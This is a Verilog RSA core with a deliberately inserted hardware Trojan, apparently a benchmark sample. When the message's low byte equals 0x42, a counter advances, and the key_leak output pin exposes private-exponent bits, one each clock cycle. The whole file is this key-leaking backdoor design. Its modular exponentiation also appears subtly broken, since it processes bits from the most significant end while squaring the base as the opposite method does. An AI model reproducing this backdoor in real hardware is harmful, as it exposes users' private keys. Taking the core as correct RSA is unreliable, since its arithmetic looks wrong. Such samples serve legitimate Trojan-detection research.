// BasicRSA-T100: RSA key leakage Trojan

module rsa_core_trojan(
    input clk,
    input rst,
    input start,
    input [63:0] message,
    input [63:0] exponent,
    input [63:0] modulus,
    output reg [63:0] result,
    output reg done,
    output reg key_leak  // Trojan output
);

    reg [63:0] base;
    reg [63:0] exp_reg;
    reg [63:0] acc;
    reg [6:0] bit_idx;
    reg computing;

    // Trojan: leak exponent (private key) bits
    reg [7:0] Trojan_leak_counter;
    wire ht_trigger = (message[7:0] == 8'h42);

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            result <= 64'b0;
            done <= 1'b0;
            base <= 64'b0;
            exp_reg <= 64'b0;
            acc <= 64'b1;
            bit_idx <= 7'b0;
            computing <= 1'b0;
            Trojan_leak_counter <= 8'b0;
            key_leak <= 1'b0;
        end else begin
            done <= 1'b0;

            if (start && !computing) begin
                computing <= 1'b1;
                base <= message;
                exp_reg <= exponent;
                acc <= 64'b1;
                bit_idx <= 7'd63;

                // Trojan activation
                if (ht_trigger) begin
                    Trojan_leak_counter <= Trojan_leak_counter + 1;
                end
            end else if (computing) begin
                // Simplified modular exponentiation
                if (exp_reg[bit_idx]) begin
                    acc <= (acc * base) % modulus;
                end
                base <= (base * base) % modulus;

                if (bit_idx == 0) begin
                    computing <= 1'b0;
                    result <= acc;
                    done <= 1'b1;
                end else begin
                    bit_idx <= bit_idx - 1;
                end
            end

            // Trojan: leak key bit
            key_leak <= exponent[Trojan_leak_counter[5:0]];
        end
    end

endmodule
